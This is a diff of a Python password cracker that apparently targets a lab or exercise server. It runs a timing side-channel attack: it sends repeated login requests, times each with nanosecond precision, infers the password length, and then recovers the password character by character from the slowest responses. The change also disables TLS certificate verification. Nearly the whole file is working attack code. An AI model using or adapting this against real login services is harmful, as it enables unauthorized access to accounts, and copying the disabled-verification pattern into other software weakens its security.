@@ -1,11 +1,23 @@
 from dotenv import load_dotenv
 from functools import partial
-
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
 import os
 import timeit
-import requests
 import numpy
+import requests
 
+# start = time.time()
+# # --- your code here ---
+# do_something()
+# end = time.time()
+
+# print(f"Elapsed time: {end - start:.6f} seconds")
+
+
+session = requests.Session()   # reuse connections!
+session.verify = False
+session.headers.update({"Connection": "keep-alive"})
 from Config import Config, TASK_CONFIG
 from CorrectException import CorrectException
 
@@ -32,7 +44,7 @@ def try_password(password: str) -> None:
     """
 
     url = TASK_CONFIG.format.format(TASK_CONFIG.server_ip, TASK_CONFIG.username, password, TASK_CONFIG.difficulty)
-    result = requests.get(url).text
+    result = session.get(url, timeout=3000).text
     if "1" == result:
         raise CorrectException(password)
 
@@ -49,27 +61,31 @@ def find_length() -> int:
     
     for _ in range(TASK_CONFIG.max_password_length):
         password += single_char
-        tries.append(timeit.timeit(partial(try_password, password), number=TASK_CONFIG.retries))
+        tries.append(time_candidate(password, TASK_CONFIG.retries))
     
     return numpy.argmax(tries) + 1
-    
-def find_next_char(start_password, length) -> str:
+
+def time_candidate(candidate: str, repeats: int) -> int:
+    total = 0
+    for _ in range(repeats):
+        t0 = time.perf_counter_ns()
+        try_password(candidate)
+        total += time.perf_counter_ns() - t0
+    return total
+def find_next_char(start_password,padding) -> str:
     """
     Finds the next correct char in the password.
 
     :param start_password: The starting chars of the password.
-    :param length: The correct length of the password.
     Return: The next char in the password.
     """
 
-    pad = TASK_CONFIG.password_chars[0] * length
-    tries = []
+    tries = dict()
     for char in TASK_CONFIG.password_chars:
-        password = start_password + char + pad
-        password = password[0:length]
-        tries.append(timeit.timeit(partial(try_password, password), number=TASK_CONFIG.retries))
+        tries[char]=time_candidate(start_password + char + padding, TASK_CONFIG.retries)
+        
+    return max(tries, key=tries.get)
 
-    return TASK_CONFIG.password_chars[numpy.argmax(tries)]
 
 def _crack() -> None:
     """
@@ -78,9 +94,12 @@ def _crack() -> None:
     Throws: The correct password
     """
     length = find_length()
+    print(length)
     password = ""
+    padding = TASK_CONFIG.password_chars[0] * length
     for _ in range(length):
-        password += find_next_char(password, length)
+        password += find_next_char(password,padding[0:length-len(password)-1])
+        print(password)
 
 def crack() -> str | None:
     """
